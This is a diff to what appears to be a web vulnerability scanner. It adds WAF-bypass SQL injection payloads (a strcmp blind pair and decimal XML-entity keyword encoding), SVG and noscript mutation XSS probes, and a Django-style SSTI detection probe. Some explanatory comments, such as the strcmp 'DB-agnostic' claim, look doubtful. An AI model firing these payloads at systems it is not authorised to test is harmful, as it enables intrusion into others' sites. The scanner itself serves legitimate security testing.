@@ -19,6 +19,10 @@ const BOOLEAN_PAIRS = [
   ["' AND 1=1-- -", "' AND 1=2-- -"],
   ['" AND "1"="1', '" AND "1"="2'],
   ["' AND 1=1#", "' AND 1=2#"],
+  // community 2026-09-28: strcmp() synonym-function blind oracle (OWASP
+  // WAF-bypass notes) — catches filters that signature-block ascii()/mid().
+  // DB-agnostic: only MySQL evaluates strcmp, others behave identically.
+  ["' AND strcmp(left('aegis',1),'a')=0-- -", "' AND strcmp(left('aegis',1),'a')=1-- -"],
 ];
 
 // canary-based UNION confirmation: {cols, build(canary)}
@@ -85,6 +89,13 @@ const TRANSFORMS = {
     const hex = (s) => [...s].map((c) => `&#x${c.charCodeAt(0).toString(16)};`).join("");
     return p.replace(/\b(UNION|SELECT|AND|OR|FROM|WHERE|SLEEP)\b/gi, (m) => hex(m));
   },
+  // community 2026-09-28: XML decimal-entity keyword encoding (PortSwigger
+  // "filter bypass via XML encoding" lab writeups, Sep 2026) — filters that
+  // normalize hex entities still miss the decimal form.
+  "xmlentities-dec": (p) => {
+    const dec = (s) => [...s].map((c) => `&#${c.charCodeAt(0)};`).join("");
+    return p.replace(/\b(UNION|SELECT|AND|OR|FROM|WHERE|SLEEP)\b/gi, (m) => dec(m));
+  },
 };
 
 const LEVEL_TRANSFORMS = {
@@ -92,7 +103,7 @@ const LEVEL_TRANSFORMS = {
   2: ["randomcase", "space2comment", "tabspace", "charencode"],
   3: ["randomcase", "space2comment", "tabspace", "newlinespace", "charencode",
       "doubleencode", "versioned-comments", "nullbyte", "keyword-split",
-      "jsonwrap", "xmlentities"],
+      "jsonwrap", "xmlentities", "xmlentities-dec"],
 };
 
 /* encodeURIComponent that preserves intentional %XX sequences from transforms */
@@ -134,9 +145,16 @@ const XSS_PROBES = [
   { name: "html-audio", t: "<audio src=x onerror={C}>", kinds: ["tag"] },
   { name: "html-input-focus", t: "<input onfocus={C} autofocus>", kinds: ["tag"] },
   { name: "html-math-nest", t: "<math><mtext><table><mglyph><style><img src=x onerror={C}>", kinds: ["tag"] },
+  // --- community additions 2026-09-28 (web-indexed writeup roundup) ---
+  // SVG <animate> href hijack: bypasses filters blocking both event handlers
+  // and href attributes (PortSwigger XSS lab writeup, Sep 2026).
+  { name: "svg-animate-href", t: '<svg><a><animate attributeName="href" values="javascript:{C}"/><text x="20" y="20">click</text></a></svg>', kinds: ["tag"] },
+  // <noscript> mutation XSS: parser keeps the <p> inert until </noscript>, so
+  // the trailing <img onerror> becomes a live element (SafePaste mXSS writeup).
+  { name: "mxss-noscript", t: '<noscript><p title="x</noscript><img src=x onerror={C}>', kinds: ["tag"] },
 ];
 
-const XSS_LEVEL_CUTOFF = { 1: 16, 2: 20, 3: 27 };
+const XSS_LEVEL_CUTOFF = { 1: 16, 2: 20, 3: 29 };
 
 /* ------------------------------------------------------------------ */
 /* SSTI — distinctive-math probes (detection only)                     */
@@ -153,6 +171,10 @@ const SSTI_PROBES = [
   `#{${SSTI_FACTOR_A}*${SSTI_FACTOR_B}}`,   // Mako / Pebble
   `*{${SSTI_FACTOR_A}*${SSTI_FACTOR_B}}`,   // Thymeleaf
   `{{7*'7'}}`,                              // Jinja2-vs-Twig distinguisher
+  // community 2026-09-28: {% %} tag evaluation (Django-family, Pongo2/Go
+  // templates per Nullcon 2026 research) — reuses SSTI_EXPECTED, so no
+  // background.js change is needed.
+  `{% if ${SSTI_FACTOR_A}*${SSTI_FACTOR_B}==${SSTI_EXPECTED} %}${SSTI_EXPECTED}{% endif %}`,
 ];
 
 /* ------------------------------------------------------------------ */
